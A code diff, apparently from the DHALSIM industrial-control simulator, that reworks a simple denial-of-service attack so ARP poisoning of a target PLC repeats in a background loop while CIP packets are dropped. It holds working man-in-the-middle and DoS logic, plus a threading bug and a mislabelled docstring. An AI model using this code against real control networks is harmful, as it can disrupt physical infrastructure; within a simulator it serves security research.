@@ -9,6 +9,8 @@ from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 import argparse
 from pathlib import Path
+import _thread
+
 
 enip_port = 44818
 sniffed_packet = []
@@ -25,10 +27,16 @@ class DirectionError(Error):
 
 
 class SimpleDoSAttack(SyncedAttack):
+
     """
     This is a simple DoS attack. This attack will launch an ARP spoofing attack and then stop forwarding CIP packets
     to the  the target PLC.
+    """
 
+    ARP_POISON_REFRESH = 50
+    """Amount of times a db query will retry on a exception"""
+
+    """
     :param intermediate_yaml_path: The path to the intermediate YAML file
     :param yaml_index: The index of the attack in the intermediate YAML
     """
@@ -55,18 +63,25 @@ class SimpleDoSAttack(SyncedAttack):
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-        # Launch the ARP poison by sending the required ARP network packets
-        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
-        if self.intermediate_yaml['network_topology_type'] == "simple":
-            for plc in self.intermediate_yaml['plcs']:
-                if plc['name'] != self.intermediate_plc['name']:
-                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])
-
-        self.logger.info(f"Start ARP Poison between {self.target_plc_ip} and "
-                          f"{self.intermediate_attack['gateway_ip']}")
-
+        _thread.start_new_thread(self.launch_mitm())
         nfqueue.bind(0, self.capture)
         nfqueue.run(block=False)
+
+    def launch_mitm(self):
+
+        while self.state == 1:
+            # Launch the ARP poison by sending the required ARP network packets
+            launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+            if self.intermediate_yaml['network_topology_type'] == "simple":
+                for plc in self.intermediate_yaml['plcs']:
+                    if plc['name'] != self.intermediate_plc['name']:
+                        launch_arp_poison(self.target_plc_ip, plc['local_ip'])
+
+            self.logger.info(f"Start ARP Poison between {self.target_plc_ip} and "
+                              f"{self.intermediate_attack['gateway_ip']}")
+
+            # We need to periodically do ARP poison, because Linux refreshes the cache
+            time.sleep(self.ARP_POISON_REFRESH)
 
     def capture(self, packet):
         parsed_packet = IP(packet.get_payload())
